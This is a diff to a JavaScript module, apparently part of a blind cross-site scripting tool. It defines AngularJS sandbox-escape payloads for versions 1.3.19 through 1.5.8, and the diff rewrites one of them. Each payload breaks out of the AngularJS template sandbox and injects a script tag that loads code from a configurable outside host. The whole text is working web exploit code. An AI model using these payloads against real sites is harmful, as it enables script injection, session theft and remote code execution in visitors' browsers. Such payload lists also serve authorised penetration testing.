@@ -25,7 +25,7 @@ exports.generatePayloads = (config) => {
     { description: 'Gareth Heyes - 1.3.19 - AngularJS Payload', payload: `{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=1;eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`)');}}`},
     { description: 'Gareth Heyes - 1.3.20 - AngularJS Payload', payload: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1;eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`)');}}`},
     { description: 'Gareth Heyes - 1.4.0 - 1.4.9 - AngularJS Payload', payload: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };eval("var _ = document.createElementNS(\\'http://www.w3.org/1999/xhtml\\', \\'script\\');_.setAttribute(\\'src\\',\\'//${config.url}/m\\');document.getElementsByTagName(\\'body\\')[0].appendChild(_)")//');}}`},
-    { description: 'Ian Hinkley -  1.5.0 - 1.5.8 - AngularJS Payload', payload: `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=eval(\`var _=document\\\\x2ecreateElement(\\'script\\');_\\\\x2esrc=\\'//${config.url}/m\\';document\\\\x2ebody\\\\x2eappendChild(_);\`)');}}`}
+    { description: 'Ian Hinkley -  1.5.0 - 1.5.8 - AngularJS Payload', payload: `{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=eval(\`var _=document.createElement(\\'script\\');_.src=\\'//${config.url}/m\\';document.body.appendChild(_);\`)');}}`}
   ];
   const structured = buildPayloadStructure(payloads);
 
